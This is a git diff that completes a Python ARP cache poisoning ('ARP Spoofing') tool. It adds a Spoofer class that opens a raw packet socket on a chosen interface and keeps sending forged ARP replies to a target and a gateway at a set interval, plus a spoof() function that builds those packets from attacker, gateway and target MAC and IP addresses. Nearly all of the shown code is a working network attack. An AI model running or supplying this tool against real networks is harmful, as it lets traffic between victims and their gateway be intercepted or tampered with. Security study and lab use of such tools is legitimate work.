@@ -9,7 +9,8 @@ A low-level ARP Cache Poisoning (a.k.a "ARP Spoofing") tool.
 
 import argparse
 import re
-import socket
+import time
+from socket import htons, inet_aton, ntohs, socket, PF_PACKET, SOCK_RAW
 
 
 class ARPPacket(object):
@@ -80,11 +81,39 @@ class ARPPacket(object):
 
 
 class Spoofer(object):
-    def __init__(self):
-        pass
+    def __init__(self,
+                 interface: str,
+                 gateway_arp_packet: bytes,
+                 target_arp_packet: bytes, *,
+                 interval: float = 0.5):
+        self.interface = interface
+        self.gateway_arp_pkt = gateway_arp_packet
+        self.target_arp_pkt = target_arp_packet
+        self.interval = interval
 
     def execute(self):
-        pass
+        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
+            sock.bind((self.interface, htons(0x0800)))
+            print('[+] ARP Spoofing attack initiated at {0}. Press Ctrl-C to '
+                  'abort.'.format(time.strftime("%H:%M:%S", time.localtime())))
+            while True:
+                try:
+                    sock.send(self.target_arp_pkt)
+                    sock.send(self.gateway_arp_pkt)
+                    time.sleep(self.interval)
+                except KeyboardInterrupt:
+                    raise SystemExit('[!] Aborting ARP Spoofing attack...')
+
+
+def spoof(args):
+    """Controls the flow of execution of the ARP Spoofer tool."""
+    packet = ARPPacket(attacker_mac=args.attackermac,
+                       gateway_mac=args.gatemac,
+                       target_mac=args.targetmac,
+                       gateway_ip=args.gateip,
+                       target_ip=args.targetip)
+    spoofer = Spoofer(args.interface, *packet.get_packets())
+    spoofer.execute()
 
 
 if __name__ == '__main__':
